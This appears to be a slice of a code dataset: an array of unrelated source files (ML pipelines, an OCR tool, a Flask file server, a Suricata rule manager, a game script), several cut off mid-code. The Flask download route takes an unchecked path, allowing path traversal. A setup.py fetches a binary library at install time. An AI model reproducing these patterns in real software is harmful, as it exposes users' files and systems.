'nccl_2.20.3-1+cuda12.2_x86_64.txz'),\n]\n\npackage_name = \"vllm_nccl_cu11\"\ncuda_name = package_name[-4:]\nnccl_version = \"2.18.1\"\nvllm_nccl_verion = \"0.1.0\"\nversion = \".\".join([nccl_version, vllm_nccl_verion])\n\nassert nccl_version == \"2.18.1\", f\"only support nccl 2.18.1, got {version}\"\n\nurl = f\"https://storage.googleapis.com/vllm-public-assets/nccl/{cuda_name}/libnccl.so.{nccl_version}\"\n\nimport urllib.request\nimport os\n\n# desination path is ~/.config/vllm/nccl/cu12/libnccl.so.2.18.1\ndestination = os.path.expanduser(f\"~/.config/vllm/nccl/{cuda_name}/libnccl.so.{nccl_version}\")\n\nos.makedirs(os.path.dirname(destination), exist_ok=True)\n\nif os.path.exists(destination):\n    print(f\"nccl package already exists at {destination}\")\nelse:\n    print(f\"Downloading nccl package from {url}\")\n    import urllib.request\n    urllib.request.urlretrieve(url, destination)\n    print(f\"nccl package downloaded to {destination}\")\n\nsetup(\n    name=package_name,\n    version=version,\n    packages=[\"vllm_nccl\"],\n)\n",
    "import csv\n\ndef extract_data(source_file, destination_file):\n    # Define the field names to extract from the source CSV file\n    field_names = ['Name','Body','Subject', 'Status', 'To','Attach']  # Adjust this list as per your CSV file structure\n    \n    # Open the source CSV file in 'read' mode\n    with open(source_file, 'r', newline='') as source:\n        reader = csv.DictReader(source)\n        \n        # Open the destination CSV file in 'write' mode\n        with open(destination_file, 'w', newline='') as destination:\n            writer = csv.DictWriter(destination, fieldnames=field_names)\n            writer.writeheader()  # Write the header row\n            \n            # Iterate through each row in the source file\n            for row in reader:\n                event=\"event name\" #event name\n                name=row['Name']\n                ambassador=\"ambassador name\" #ambassador name\n                sub=f\"Congratulations {row['Name']}\"\n                files=f\"{row['Name']}.pdf\"\n                coustomestr=f\"\"\"\n\nThank you for your participation in the {event}!\n\nDear {name},\nThank you so much for your interest in being a part of the {event} program.\nWe appreciate your time and effort in completing the program.\nThis email contains your certificate of participation.\nPlease feel free to reply back to this email should you have any questions.\nLooking forward to seeing you further programs,\n{ambassador}, Microsoft Learn Student Ambassadors.\"\"\"\n                # Extract the required fields and write them to the destination file\n                if row['Name']!=\" \":\n                    writer.writerow({'Name': row['Name'], 'To': row['Email'],'Body': coustomestr,'Status':\"Send\",'Subject':sub,'Attach':files})  # Adjust field names as needed\n\n# Example usage:\nsource_file = 'data.csv' #sourse file which contains participants data\ndestination_file = 'destination.csv' #file where the data should be written\nextract_data(source_file, destination_file)\n",
    "import math\n\n\ndef solvepart1():\n    #read data into 2 dictionaries\n    data = fileRead(\"input.txt\")\n    global modules\n    modules = {\"button\": (\"*\", (\"broadcaster\",)), \"rx\": (\"*\", ())}\n    global modulesState\n    modulesState = {\"button\": {}}\n    for row in data:\n        splitRow = row.split(\" -> \")\n        nameType = splitRow[0]\n        destinationsStr = splitRow[1]\n        if (\"%\" in nameType) or (\"&\" in nameType):\n            name = nameType[1:]\n            moduleType = nameType[0]\n        else:\n            name = nameType\n            moduleType = \"*\"\n        destinations = tuple(destinationsStr.strip().split(\", \"))\n        modules[name] = (moduleType, destinations)\n        modulesState[name] = {}\n    for module, data in modules.items():\n        for outModule in data[1]:\n            if outModule != \"rx\":\n                modulesState[outModule][module] = 0\n\n    # #press button 1000 times\n    lowPulses = 0\n    highPulses = 0\n    for _ in range(1000):\n        low, high = pressButton()\n        lowPulses += low\n        highPulses += high\n\n    print(lowPulses * highPulses)\n\n#propogate signal through modules, breadth-first, updating global modules state as it goes\ndef pressButton():\n    totalLow = 0\n    totalHigh = 0\n    queue = [(\"broadcaster\",0,\"button\")]\n    while len(queue) > 0:\n        currentModule = queue.pop(0)\n        moduleName = currentModule[0]\n        incomingSignal = currentModule[1]\n        prevModule = currentModule[2]\n        moduleType = modules[moduleName][0]\n        outModules = modules[moduleName][1]\n\n        if incomingSignal == 0: totalLow += 1\n        else: totalHigh += 1\n\n        if moduleName == \"rx\":\n            continue\n\n        if moduleType == \"%\":\n            if incomingSignal == 0:\n                state = modulesState[moduleName].get(0, 0)\n                state = 1-state\n                modulesState[moduleName][0] = state\n                for module in outModules:\n                    queue.append((module, state, moduleName))\n        elif moduleType == \"&\":\n            modulesState[moduleName][prevModule] = incomingSignal\n            allHigh = True\n            for value in modulesState[moduleName].values():\n                if value == 0:\n                    allHigh = False\n                    break\n            if allHigh: outState = 0\n            else: outState = 1\n            for module in outModules:\n                    queue.append((module, outState, moduleName))\n        else:\n            for module in outModules:\n                queue.append((module, incomingSignal, moduleName))\n\n    return totalLow, totalHigh\n\ndef solvepart2():\n    #read data into 2 dictionaries\n    data = fileRead(\"input.txt\")\n    global modules\n    modules = {\"button\": (\"*\", (\"broadcaster\",)), \"rx\": (\"*\", ())}\n    global modulesState\n    modulesState = {\"button\": {}}\n    for row in data:\n        splitRow = row.split(\" -> \")\n        nameType = splitRow[0]\n        destinationsStr = splitRow[1]\n        if (\"%\" in nameType) or (\"&\" in nameType):\n            name = nameType[1:]\n            moduleType = nameType[0]\n        else:\n            name = nameType\n            moduleType = \"*\"\n        destinations = tuple(destinationsStr.strip().split(\", \"))\n        modules[name] = (moduleType, destinations)\n        modulesState[name] = {}\n    for module, data in modules.items():\n        for outModule in data[1]:\n            if outModule != \"rx\":\n                modulesState[outModule][module] = 0\n\n    # #press button until a cycle has been found for xc, th, bp, and pd\n    numpresses = 0\n    cycles = {}\n    while True:\n        newCycles = pressButtonCycleCheck()\n        numpresses += 1\n        \n        for k,v in newCycles.items():\n            if v:\n                cycles[k] = numpresses\n\n        if len(cycles) >= 4:\n            break\n\n    print(cycles)\n    print(math.lcm(*list(cycles.values())))\n\n#propogate signal through modules, breadth-first, updating global modules state as it goes, looking for cycles for xc, th, bp, and pd\ndef pressButtonCycleCheck():\n    cycles = {}\n    queue = [(\"broadcaster\",0,\"button\")]\n    while len(queue) > 0:\n        currentModule = queue.pop(0)\n        moduleName = currentModule[0]\n        incomingSignal = currentModule[1]\n        prevModule = currentModule[2]\n        moduleType = modules[moduleName][0]\n        outModules = modules[moduleName][1]\n\n        if moduleName == \"rx\":\n            continue\n        for module in (\"xc\",\"th\",\"bp\",\"pd\"):\n            if moduleName == module and incomingSignal == 0:\n                cycles[module] = True\n\n        if moduleType == \"%\":\n            if incomingSignal == 0:\n                state = modulesState[moduleName].get(0, 0)\n                state = 1-state\n                modulesState[moduleName][0] = state\n                for module in outModules:\n                    queue.append((module, state, moduleName))\n        elif moduleType == \"&\":\n            modulesState[moduleName][prevModule] = incomingSignal\n            allHigh = True\n            for value",
    "# Generated by BehavEd\r\nstartCutScene(\"FALSE\", \"FALSE\" )\r\nfaceEntity(\"ff_striker01\", \"console01\" )\r\nfaceEntity(\"ff_striker02\", \"console02\" )\r\ncameraMove(\" -846.830 -196.050 224.250 \", 2.000 )\r\ncameraPan(\" 0.000 46.500 73.200 \", 2.000, \"FALSE\" )\r\nwaittimed ( 1.000 )\r\nfaceEntity(\"ws01\", \"console01\" )\r\nfaceEntity(\"rm01\", \"console02\" )\r\nwaittimed ( 1.000 )\r\nmoveHeroesToEnt(\"hero_spot01\" )\r\nwaittimed ( 0.500 )\r\nsound (  \"PLAY_SOUND\", \"Zone_shared/heli/console\", \"\", \"\" )\r\nplayanim (  \"EA_USE_BUTTON\", \"ff_striker01\", \"NONE\", \"\" )\r\nplayanim (  \"EA_USE_BUTTON\", \"ff_striker02\", \"NONE\", \"animsig01\" )\r\nwaitsignal ( \"animsig01\" )\r\nremove ( \"ff_button01\", \"ff_button01\" )\r\nremove ( \"ff_button02\", \"ff_button02\" )\r\ncameraMove(\" -272.390 -533.370 226.800 \", 1.000 )\r\ncameraPan(\" 0.000 45.000 0.000 \", 1.000, \"FALSE\" )\r\nwaittimed ( 1.000 )\r\nspawnEffect(\"ff_spot02\", \"map/heli/forcefield_20ft_expire\", \" 0.000 0.000 0.000 \", \" 0.000 0.000 0.000 \" )\r\nwaittimed ( 0.250 )\r\ncopyOriginAndAngles(\"force_field02\", \"ff_spot02\" )\r\nwaittimed ( 1.000 )\r\nfaceEntity(\"ws01\", \"hero_spot01\" )\r\nfaceEntity(\"rm01\", \"hero_spot01\" )\r\ncameraMove(\" -434.890 -589.730 181.340 \", 1.000 )\r\ncameraPan(\" 0.000 33.100 157.900 \", 1.000, \"FALSE\" )\r\nwaittimed ( 1.000 )\r\nremove ( \"ff_striker01\", \"ff_striker01\" )\r\nremove ( \"ff_striker02\", \"ff_striker02\" )\r\nisHere = isActorOnTeam(\"captainamerica\" )\r\nDoomisHere = isActorOnTeam(\"doomdlc\")\r\nif DoomisHere == 1\r\n\t# ( \"Play this conversation if doom is on the team\" )\r\n    sound (  \"PLAY_SOUND\", \"common/game/achievement\", \"\", \"\" )\r\n    createPopupDialogXml(\"dialogs/special/doomwinter_achievement\" )\r\n    waittimed ( 0.100 )\r\n\tstartConversation(\"act1/heli/heli3/1_heli3_030_DLC\" )\r\nelse\r\n\tif isHere == 1\r\n\t     # ( \"Play this conversation if CAP is on the team\" )\r\n\t     startConversation(\"act1/heli/heli3/1_heli3_040\" )\r\n\telse\r\n\t     isHere = isActorOnTeam(\"thor\" )\r\n\t     if isHere == 1\r\n\t\t  # ( \"Play this conversation if CAP not on the team, But Thor IS\" )\r\n\t\t  startConversation(\"act1/heli/heli3/1_heli3_050\" )\r\n\t     else\r\n\t\t  # ( \"Play this conversation if both thor and Cap are not here\" )\r\n\t\t  startConversation(\"act1/heli/heli3/1_heli3_030\" )\r\n\t     endif\r\n\tendif\r\nendif\r\n\r\n",
    "import random\n\nimport numpy as np\nimport pandas as pd\nimport seaborn as sns\nimport streamlit as st\nfrom scipy.stats import ttest_rel\nfrom sklearn.linear_model import LinearRegression\nfrom sklearn.metrics import mean_absolute_error, mean_squared_error, r2_score\nfrom sklearn.model_selection import train_test_split, cross_val_score, GridSearchCV\nfrom sklearn.multioutput import MultiOutputRegressor\nfrom sklearn.preprocessing import StandardScaler\n\nst.set_option('deprecation.showPyplotGlobalUse', False)\n\n# Streamlit layout\nst.title('Machine Learning Pipeline')\n\n# Constants\nTEST_SIZE = 0.2\nRANDOM_STATE = 42\n\n# Load data\ntrain = pd.read_csv('train.csv')\ntest = pd.read_csv('test.csv')\n\n# Data Exploration\nst.subheader('Data Exploration')\nst.write('Train data head:', train)\nst.write('Test data head:', test)\n\n# Preprocessing\n# One-hot encoding for 'lithology' feature\ntrain = pd.get_dummies(train, columns=['lithology'])\ntest = pd.get_dummies(test, columns=['lithology'])\n\n# Align train and test\ntrain, test = train.align(test, join='left', axis=1)\n\n# Fill missing values in test with 0 (since these are one-hot encoded features)\ntest.fillna(0, inplace=True)\n\n# Feature scaling\nscaler = StandardScaler()\nbv_pc_cols = ['bv_' + str(i) for i in range(101)] + ['pc_' + str(i) for i in range(101)]\nfeatures = train.drop(bv_pc_cols, axis=1)\ntargets = train[bv_pc_cols]\ntrain[features.columns] = scaler.fit_transform(train[features.columns])\ntest[features.columns] = scaler.transform(test[features.columns])\n\n# Baseline\nst.subheader('Baseline Model')\nmeans = targets.mean()\nbaseline_predictions_train = pd.DataFrame([means] * len(train), columns=means.index)\nbaseline_scores_train = mean_absolute_error(targets, baseline_predictions_train)\nst.dataframe(baseline_predictions_train)\nst.write('Baseline MAE score:', baseline_scores_train)\n\n# Model\nst.subheader('Machine Learning Model')\nX_train, X_val, y_train, y_val = train_test_split(features, targets, test_size=TEST_SIZE, random_state=RANDOM_STATE)\nmodel = MultiOutputRegressor(LinearRegression())\nmodel.fit(X_train, y_train)\n\n# Feature Importance\nst.subheader('Feature Importance')\nimportances = pd.DataFrame(data={\n    'Attribute': X_train.columns,\n    'Importance': np.mean([est.coef_ for est in model.estimators_], axis=0)\n})\nimportances = importances.sort_values(by='Importance', ascending=False)\nst.dataframe(importances)\nsns.barplot(x='Importance', y='Attribute', data=importances)\nst.pyplot()\n\n# Evaluation\nst.subheader('Model Evaluation')\nscores = cross_val_score(model, X_train, y_train, scoring='neg_mean_absolute_error', cv=5)\nmodel_scores = -scores\nst.write('Cross-validated MAE scores:', model_scores)\nst.write('Mean cross-validated MAE score:', model_scores.mean())\n\n# Additional Metrics\ny_train_pred = model.predict(X_train)\nst.write('Training Root Mean Squared Error:', np.sqrt(mean_squared_error(y_train, y_train_pred)))\nst.write('Training R-squared:', r2_score(y_train, y_train_pred))\n\n# Hyperparameter tuning\nst.subheader('Hyperparameter Tuning')\nparams = {\n    'estimator__fit_intercept': [True, False],\n    'estimator__normalize': [True, False],\n    'estimator__copy_X': [True, False],\n    'estimator__n_jobs': [-1]\n}\ngrid = GridSearchCV(model, params, cv=5, scoring='neg_mean_absolute_error')\ngrid.fit(X_train, y_train)\nbest_model = grid.best_estimator_\nbest_params = grid.best_params_\nbest_score = -grid.best_score_\n\nst.write('Best parameters:', best_params)\nst.write('Best score:', best_score)\n\n# Model evaluation with the best model\nbest_model.fit(X_train, y_train)\n\n# Additional Metrics with the best model\ny_train_pred_best = best_model.predict(X_train)\nst.write('Training Root Mean Squared Error (Best Model):',\n         np.sqrt(mean_squared_error(y_train, y_train_pred_best)))\nst.write('Training R-squared (Best Model):', r2_score(y_train, y_train_pred_best))\n\n# Model comparison with the best model\n_, p_value = ttest_rel(-cross_val_score(best_model, X_train, y_train, scoring='neg_mean_absolute_error', cv=5),\n                       np.full((5,), baseline_scores_train))\nif p_value < 0.05:\n    st.write('The best model significantly outperforms the baseline.')\nelse:\n    st.write('The best model does not significantly outperform the baseline.')\n\n# Error Analysis\nst.subheader('Error Analysis')\n\n# Calculate the absolute errors for training predictions\ntrain_errors = np.abs(y_train - y_train_pred_best)\n\n# Calculate the mean absolute error (MAE) for each target variable\nmae_per_target = train_errors.mean(axis=0)\n\n# Display the MAE for each target variable\nst.write('Mean Absolute Error (MAE) per Target Variable:')\nst.write(mae_per_target)\n\n# Find the index of the target variable with the highest MAE\nworst_target_index = np.argmax(mae_per_target)\n\n# Get the actual and predicted values for the worst target variable\nactual_worst = y_train.iloc[:, worst_target_index]\npredicted_worst = y_train_pred_best[:, worst_target_index]\n\n# Create a DataFrame to display the worst predictions\nworst_predictions = pd.DataFrame({\n ",
    "from singlelist import SingleList as sl\n\n### MENU\ndef menu():\n    print()\n    print(\"##########################\")\n    print(\"  1. CREATE HEAD-NODE \")\n    print(\"  2. APPEND NODE \")\n    print(\"  3. INSERT NODE \")\n    print(\"  4. MODIFY NODE \")\n    print(\"  5. DELETE NODE \")\n    print(\"  6. PRINT NODES \")\n    print(\"  7. QUIT \")\n    print(\"##########################\")\n    print()\n\n#### MAIN\nprint(\"######################################################\")\nprint(\" Hey Guys, A Simple linked list has been created....\")\nprint(\" Please select one of the menus below to continue.\")\nprint(\"#####################################################\")\n\nslist = sl()\nchoice = \"999\"\n\nwhile choice != \"7\":\n    menu()\n    choice = input(\"SELECT MENU? ==>  \")\n\n    if choice == \"1\":\n       slist.create_head()\n    elif choice == \"2\":\n        print()\n        data = input(\"Enter the data you want to add.. ==> \")\n        if data == None:\n            print(\"No data has been entered. Please check the data...\")\n        else:\n            slist.node_append(data)\n\n    elif choice == \"3\":\n        find = input(\"Insert data value ==> \")\n        data = input(\"Enter the data you want to add.. ==> \")\n        result = slist.node_insert(find, data)\n        if result[0] == 100:\n            print(result[1])\n        else: print(result[1])\n\n        pass\n    elif choice == \"4\":\n        slist.all_print()\n        raw = input(\"raw data? \")\n        change = input(\"Input change data? \")\n        slist.node_modify(raw, change)\n        pass\n    elif choice == \"5\":\n        slist.all_print()\n        raw = input(\"Input delete data ? \")\n        slist.node_delete(raw)\n        pass\n    elif choice == \"6\":\n        slist.all_print()\n        pass\n    elif choice == \"7\":\n        print(\"Exit the program, Good-Bye....\")\n        break\n\n    else:\n        print(\" Wrong menu-number...\")\n\n# slist.create_head()\n#\n# slist.node_append(\"park\")\n# slist.node_append(\"choi\")\n# slist.node_append(\"lee\")\n# slist.node_insert(\"choi\", \"hwang\")\n#\n# slist.all_print()\n\n",
    "from fastapi import FastAPI, File, UploadFile\nfrom fastapi.responses import JSONResponse\nimport av\nimport numpy as np\nfrom PIL import Image\nfrom huggingface_hub import hf_hub_download\nfrom transformers import AutoProcessor, AutoModelForCausalLM\n\napp = FastAPI()\n\nprocessor = AutoProcessor.from_pretrained(\"microsoft/git-base-vatex\")\nmodel = AutoModelForCausalLM.from_pretrained(\"microsoft/git-base-vatex\")\n\nnp.random.seed(45)\n\n\ndef read_video_pyav(container, indices):\n    '''\n    Decode the video with PyAV decoder.\n    Args:\n        container (`av.container.input.InputContainer`): PyAV container.\n        indices (`List[int]`): List of frame indices to decode.\n    Returns:\n        result (np.ndarray): np array of decoded frames of shape (num_frames, height, width, 3).\n    '''\n    frames = []\n    container.seek(0)\n    start_index = indices[0]\n    end_index = indices[-1]\n    for i, frame in enumerate(container.decode(video=0)):\n        if i > end_index:\n            break\n        if i >= start_index and i in indices:\n            frames.append(frame)\n    return np.stack([x.to_ndarray(format=\"rgb24\") for x in frames])\n\n\ndef sample_frame_indices(clip_len, frame_sample_rate, seg_len):\n    '''\n    Sample a given number of frame indices from the video.\n    Args:\n        clip_len (`int`): Total number of frames to sample.\n        frame_sample_rate (`int`): Sample every n-th frame.\n        seg_len (`int`): Maximum allowed index of sample's last frame.\n    Returns:\n        indices (`List[int]`): List of sampled frame indices\n    '''\n    converted_len = int(clip_len * frame_sample_rate)\n    end_idx = np.random.randint(converted_len, seg_len)\n    start_idx = end_idx - converted_len\n    indices = np.linspace(start_idx, end_idx, num=clip_len)\n    indices = np.clip(indices, start_idx, end_idx - 1).astype(np.int64)\n    return indices\n\n\n@app.post(\"/caption_video/\")\nasync def caption_video(file: UploadFile = File(...)):\n    try:\n        with open(file.filename, \"wb\") as buffer:\n            buffer.write(await file.read())\n\n        container = av.open(file.filename)\n\n        num_frames = model.config.num_image_with_embedding\n        indices = sample_frame_indices(\n            clip_len=num_frames, frame_sample_rate=4, seg_len=container.streams.video[0].frames\n        )\n        frames = read_video_pyav(container, indices)\n\n        pixel_values = processor(images=list(frames), return_tensors=\"pt\").pixel_values\n\n        generated_ids = model.generate(pixel_values=pixel_values, max_length=50)\n\n        captions = processor.batch_decode(generated_ids, skip_special_tokens=True)\n\n        return JSONResponse(content={\"captions\": captions})\n\n    except Exception as e:\n        return JSONResponse(content={\"error\": str(e)})\n",
    "import pytesseract\nimport pandas as pd\nimport os\nimport numpy as np\nimport cv2\nfrom PySide6 import QtWidgets\n\nfrom natsort import natsorted\nfrom matplotlib import pyplot as plt\nfrom exceptions import IndexException\n\npytesseract.pytesseract.tesseract_cmd = (\n    r\"C:\\Program Files\\Tesseract-OCR\\tesseract.exe\"\n)\n\n\ndef image_scrapper(path):\n    '''\n    oem - OCR Engine Mode\n        0 = Original Tesseract only.\n        1 = Neural nets LSTM only.\n        2 = Tesseract + LSTM.\n        3 = Default, based on what is available.\n    psm - Page Segmentation Mode\n        0 = Orientation and script detection (OSD) only.\n        1 = Automatic page segmentation with OSD.\n        2 = Automatic page segmentation, but no OSD, or OCR.\n            (not implemented)\n        3 = Fully automatic page segmentation, but no OSD. (Default)\n        4 = Assume a single column of text of variable sizes.\n        5 = Assume a single uniform block of vertically aligned text.\n        6 = Assume a single uniform block of text.\n        7 = Treat the image as a single text line.\n        8 = Treat the image as a single word.\n        9 = Treat the image as a single word in a circle.\n        10 = Treat the image as a single character.\n        11 = Sparse text. Find as much text as possible in no particular\n            order.\n        12 = Sparse text with OSD.\n        13 = Raw line. Treat the image as a single text line,\n            bypassing hacks that are Tesseract-specific.\n    '''\n    custom_config = r'--psm 6 -c \"tessedit_char_whitelist=0123456789., \"'\n    img = cv2.imread(path)\n    img = cv2.resize(\n        img,\n        None,\n        fx=4,\n        fy=4,\n        interpolation=cv2.INTER_CUBIC\n    )\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    kernel = np.ones((2, 2), np.uint8)\n    dilated_image = cv2.dilate(gray, kernel, iterations=1)\n    eroded_image = cv2.erode(dilated_image, kernel, iterations=1)\n    thresh = cv2.threshold(\n        eroded_image,\n        205,\n        255,\n        cv2.THRESH_BINARY\n    )[1]\n    kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (3, 3))\n    morh_image = cv2.morphologyEx(thresh, cv2.MORPH_CLOSE, kernel)\n    blur_image = cv2.threshold(\n        cv2.bilateralFilter(morh_image, 5, 75, 75),\n        0,\n        255,\n        cv2.THRESH_BINARY + cv2.THRESH_OTSU\n    )[1]\n    count_white = np.sum(blur_image > 0)\n    count_black = np.sum(blur_image == 0)\n    if count_black > count_white:\n        result = 255 - blur_image\n    else:\n        result = blur_image\n    result = cv2.GaussianBlur(result, (7, 7), 0)\n    try:\n        text = pytesseract.image_to_string(\n            result,\n            config=custom_config\n        )\n        cleared_text = (\n            text\n            .replace('_', '')\n            .replace(',', '.')\n            .replace('|', '')\n            .replace(')', '')\n            .replace('(', '')\n            .replace('@', '0')\n            .replace('\\n\\n', '\\n')\n            .replace('  ', ' ')\n            .replace('\\n ', '\\n')\n            .replace(' .', ' 0.')\n            .replace('. ', ' ')\n            .replace('.\\n', '\\n')\n            .replace('C', '')\n            .replace('\u20ac', '')\n        )\n        if cleared_text.strip()[-1] == '.':\n            cleared_text = cleared_text[:-2]\n        return cleared_text\n    except pytesseract.pytesseract.TesseractNotFoundError as error:\n        msg = QtWidgets.QMessageBox()\n        msg.setIcon(QtWidgets.QMessageBox.Critical)\n        msg.setText(\"Error!\")\n        msg.setInformativeText(f'{error}')\n        msg.setWindowTitle(\"Pytesseract error\")\n        msg.exec()\n\n\ndef index_checker(df):\n    start_index = df.index[0]\n    stop_index = df.index[len(df) - 1]\n    if start_index != 0 or stop_index != len(df) - 1:\n        raise IndexException(start_index, stop_index)\n\n\ndef text_to_df(name):\n    try:\n        df = pd.read_csv(\n            f\"results/{name}.csv\",\n            sep=' ',\n            header=None,\n            names=[\"Column1\", \"Column2\"]\n        )\n        index_checker(df)\n    except (pd.errors.ParserError, IndexException):\n        df = pd.read_csv(\n            f\"results/{name}.csv\",\n            sep=' ',\n            header=None,\n            names=[\"Column1\", \"Column2\", \"Column3\"]\n        )\n        for i in range(len(df[\"Column1\"])):\n            if not np.isnan(df['Column3'][i]):\n                if float(df.loc[i, \"Column2\"]) < 1:\n                    df.loc[i, \"Column1\"] = float(\n                            df.loc[i, \"Column1\"]\n                        ) + float(\n                            df.loc[i, \"Column2\"]\n                        )\n                else:\n                    df.loc[i, \"Column1\"] = float(\n                        str(df.loc[i, \"Column1\"])[:-2] + '.' +\n                        str(df.loc[i, \"Column2\"])[:-2]\n                        )\n                df.loc[i, \"Column2\"] = df.loc[i, \"Column3\"]\n        del df['Column3']\n    df[\"Column1\"] = df[\"Column1\"].astype(float)\n    df[\"Column2\"] = df[\"Column2\"].astype(float)\n    if np.isnan(df['Column2'][0]):\n     ",
    "from flask import Flask, request, send_file, render_template\nimport sqlite3\nimport os\n\napp = Flask(__name__)\n\n# Function to initialize the database\ndef initialize_database():\n    conn = sqlite3.connect('ChenChenDisk.db')\n    c = conn.cursor()\n    c.execute('''CREATE TABLE IF NOT EXISTS files\n                 (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                  filename TEXT,\n                  is_folder INTEGER)''')\n    conn.commit()\n    conn.close()\n\n# Function to save file or folder details to the database\ndef save_to_database(name, is_folder):\n    conn = sqlite3.connect('ChenChenDisk.db')\n    c = conn.cursor()\n    c.execute(\"INSERT INTO files (filename, is_folder) VALUES (?, ?)\", (name, is_folder))\n    conn.commit()\n    conn.close()\n\n# Function to get files and folders from the database\ndef get_files_from_database():\n    conn = sqlite3.connect('ChenChenDisk.db')\n    c = conn.cursor()\n    c.execute(\"SELECT * FROM files\")\n    files = c.fetchall()\n    conn.close()\n    return files\n\n# Route for the home page\n@app.route('/')\ndef index():\n    files = get_files_from_database()\n    return render_template('index.html', files=files)\n\n# Route to handle file/folder creation\n@app.route('/create', methods=['POST'])\ndef create():\n    name = request.form['name']\n    is_folder = int(request.form['is_folder'])\n    if name:\n        if is_folder:\n            os.makedirs(os.path.join('uploads', name), exist_ok=True)\n        save_to_database(name, is_folder)\n    return \"File or folder created successfully!\"\n\n# Route to handle file downloads\n@app.route('/download/<path:filename>')\ndef download_file(filename):\n    return send_file(os.path.join('uploads', filename), as_attachment=True)\n\nif __name__ == '__main__':\n    initialize_database()\n    app.run(debug=True)\n",
    "\"\"\"\n * Copyright 2001-2024 The Apache Software Foundation.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\"\"\"\n\nimport json\nimport os\nimport yaml\nimport requests\nimport tarfile\nimport shutil\nimport paths\nimport glob\nimport program_expcetion\nfrom urllib.parse import urlparse\nfrom colorama import Style, Fore\n\ndef print_used_groups(filter=\"*\", long_list=False):\n    \"\"\"Prints all used rule groups (.rules files) on a given instance.\n\n       Parameters\n       ----------\n       filter : str\n           Filter to be applied to only list groups which match the filter\n       long_list : boolean\n           If True, list groups matching the filter along with description otherwise just list groups.\n\n       Returns\n       -------\n       result: int\n           Returns 0 if listing was successful.\n        \"\"\"\n\n    get_groups(filter, long_list)\n\n    return 0\n\n\ndef is_group_present(sources, filter_pattern):\n    \"\"\"Checks if a given rule group is present among used rule sources .rule files used to create suricata.rules file\n\n       Parameters\n       ----------\n       sources : .json config\n           Json configuration file containing a list of all sources used by the programm.\n       filter_pattern : str\n           Pattern used to identify a given group\n\n       Returns\n       -------\n       source:\n           Returns a source in which a given group is found. Otherwise returns None.\n        \"\"\"\n    for source in sources[\"Remote_Rule_Sources\"] + sources.get(\"Local_Rule_Sources\", []):\n        for file_info in source['Source_Files']:\n            if any(match_group_names(file_name, filter_pattern) for file_name in file_info):\n                return source\n\n    return \"\"\n\n\ndef match_group_names(file_name, filter_pattern):\n    \"\"\"Matches filtered group name supplied by the user with a group name stored in json.config file listing all used groups.\n\n       If eg. group emerging-info.rules is used supplying bot emerging-info as well as emerging-info.rules should produce a match.\n\n       Parameters\n       ----------\n       file_name : str\n           File name of rule group being worked on by the programm.\n       filter_pattern : str\n           Pattern used to identify a given group (user supplied)\n\n       Returns\n       -------\n       match: boolean\n           Returns True if the filter_pattern supplied by user matches the name of file_name worked on by the programm.\n        \"\"\"\n    file_name_without_extension = file_name.rsplit('.rules', 1)[0]\n    filter_pattern_without_extension = filter_pattern.rsplit('.rules', 1)[0]\n\n    return file_name_without_extension.lower() == filter_pattern_without_extension.lower()\n\n\ndef get_groups(filter_pattern,long_list):\n    \"\"\"Loads JSON configuration file containing a list of all used groups matching user supplied filter_pattern.\n       If user requires long list groups matching the pattern are written along with their description.\n\n       Parameters\n       ----------\n       filter_pattern : str\n           Pattern used to identify a given group (user supplied)\n       long_list : boolean\n           Specifies if used rule groups should be printed also with their description.\n\n        \"\"\"\n    config = load_json_config()\n    print_output(config,  long_list,filter_pattern)\n\ndef print_output(sources, long_list,filter_pattern):\n    \"\"\"Prints output. In this case it is the list of all rule groups used by the IDS as defined in JSON configuration file.\n       Outputs either just the group names or group names with description.\n       In case a filter_pattern is provided it outputs only groups matching the decsription\n\n       Parameters\n       ----------\n       sources : JSON\n           JSON configuration file containing all used rule soruces along with corresponding groups\n       long_list : boolean\n           Specifies if used rule groups should be printed also with their description.\n       filter_pattern : boolean\n           Pattern used to identify a given group (user supplied)\n        \"\"\"\n    matching_source = is_group_present(sources,filter_pattern)\n\n    if filter_pattern != \"*\" and matching_source == \"\":\n        print(f\"\\nAny of Rule Sources does not contain group: \\'{filter_pattern}\\'\\n\\nTo list all groups in rule sources use -g\")\n        return\n\n    print(f\"\\n{Fore.BLUE}Rule Sources:{Style.RESET_ALL}\")\n\n    for source in sources[\"Remote_Rule_Sources\"] + sources.get(\"Local_Rule_Sources\", []):\n        if filter_pattern != \"*\" and source != matching_source:\n            continue\n        print(\"---------",
    "import cv2\nimport time\nimport os\nimport shutil\nimport logging\nimport subprocess\nimport configparser\nimport threading\nimport tkinter as tk\nimport numpy as np\nfrom datetime import datetime\nfrom PIL import Image, ImageTk\nfrom queue import Queue\nimport telegram_functions as tf\nimport sys\n\ndef print_header():\n    if os.geteuid() != 0:\n        print(\"Devi eseguire questo programma come utente root.\")\n        exit()\n    header = \"\"\"\n\\033[1;31mcamTGalert - Pawel 'okno' Zorzan Urban\n             https://pawelzorzan.com\"\"\"\n    print(header)\n\ndef print_instructions():\n    instructions = \"\"\"\n\\033[1;32mWEBCAM to Telegram Application GUI & Daemon\\033[0m\"\"\"\n    print(instructions)\n\ndef check_dependencies():\n    dependencies = ['python-telegram-bot', 'opencv-python', 'opencv-python-headless']\n    missing_dependencies = []\n    for dependency in dependencies:\n        try:\n            subprocess.check_output(['pip3', 'show', dependency])\n        except subprocess.CalledProcessError:\n            missing_dependencies.append(dependency)\n\n    if missing_dependencies:\n        print(\"\\033[1;31mAttenzione: Le seguenti dipendenze sono mancanti:\\033[0m\")\n        for dependency in missing_dependencies:\n            print(f\" - {dependency}\")\n        print(\"\\033[1;31mPer favore, esegui i seguenti comandi per ottenerle tramite pip3:\\033[0m\")\n        print(\"   - pip3 install \" + \" \".join(missing_dependencies))\n        exit()\n    try:\n        subprocess.check_output(['v4l2-ctl', '--version'])\n    except subprocess.CalledProcessError:\n        print(\"\\033[1;31mAttenzione: Il comando v4l2-ctl non \u00e8 installato sul sistema.\\033[0m\")\n        print(\"\\033[1;31mAssicurati di avere installato il pacchetto 